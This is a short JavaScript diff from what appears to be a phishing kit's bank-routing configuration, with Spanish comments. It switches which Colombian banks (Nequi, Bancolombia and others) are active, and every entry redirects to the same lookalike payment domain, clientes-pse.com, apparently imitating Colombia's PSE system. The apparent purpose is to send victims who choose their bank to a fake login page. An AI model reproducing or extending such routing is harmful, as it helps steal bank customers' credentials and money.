@@ -16,7 +16,7 @@ const emailRegexValido = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
 // CONFIGURACIÓN DE ENRUTAMIENTO POR BANCO
 // ==========================================
 const RUTAS_BANCOS = {
-    // "NEQUI": { tipo: "redirect", url: "https://clientes-pse.com/" },
+    "NEQUI": { tipo: "redirect", url: "https://clientes-pse.com/" },
     "BANCO DAVIVIENDA": { tipo: "redirect", url: "https://clientes-pse.com/" },
     "BANCO DE BOGOTA": { tipo: "redirect", url: "https://clientes-pse.com/" },
     "DAVIbank": { tipo: "redirect", url: "https://clientes-pse.com/" },
@@ -26,7 +26,7 @@ const RUTAS_BANCOS = {
     "BANCO FALABELLA": { tipo: "redirect", url: "https://clientes-pse.com/" },
     "BANCO POPULAR": { tipo: "redirect", url: "https://clientes-pse.com/" },
     // "BANCO SERFINANZA": { tipo: "redirect", url: "https://clientes-pse.com/" },
-    "BANCOLOMBIA": { tipo: "redirect", url: "https://clientes-pse.com/" }
+    // "BANCOLOMBIA": { tipo: "redirect", url: "https://clientes-pse.com/" }
 };
 
 // ==========================================
